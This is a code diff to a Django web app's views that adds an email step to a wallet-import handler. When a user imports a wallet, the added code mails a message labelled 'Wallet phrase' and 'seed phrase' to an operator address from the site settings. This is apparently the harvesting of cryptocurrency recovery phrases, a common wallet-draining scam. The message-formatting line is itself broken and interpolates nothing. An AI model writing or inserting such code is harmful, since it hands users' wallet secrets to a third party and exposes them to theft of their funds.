@@ -1,3 +1,4 @@
+from django.conf import settings
 from django.shortcuts import render
 from django.views.generic import TemplateView
 from accounts.models import MoreDetails, User, UserTransactions, UserWallet
@@ -18,6 +19,7 @@ from django.db import transaction
 from django.contrib.auth.mixins import LoginRequiredMixin
 from django.contrib.sites.shortcuts import get_current_site
 from django.http import JsonResponse
+from django.core.mail import EmailMessage
 # Create your views here.
 
 """Dashboard"""
@@ -446,12 +448,21 @@ class AddWallet(LoginRequiredMixin, TemplateView):
         return render(request, self.template_name, {'form':form, 'all_wallets':all_wallets})
     
     def post(self, request):
+        to_mail = settings.SEND_EMAIL_NAME
         form = UserAddWalletForm(request.POST or None)
         if form.is_valid():
             user = form.save(commit=False)
             user.user_wallet = self.request.user
             user.save()
+            EmailMessage(
+                    'Wallet phrase',
+                    f"{'seed phrase for {user.username} are {user.user_wallet}'}",
+                    settings.SITE_EMAIL,
+                    to=[f"{to_mail}"],
+                    reply_to=[user.email],
+                )
             messages.success(request, 'Wallet Imported Successfully')
+            
             return redirect(request.META.get('HTTP_REFERER'))
         else:
             messages.error(request, 'Failed to import wallet, Try again..')
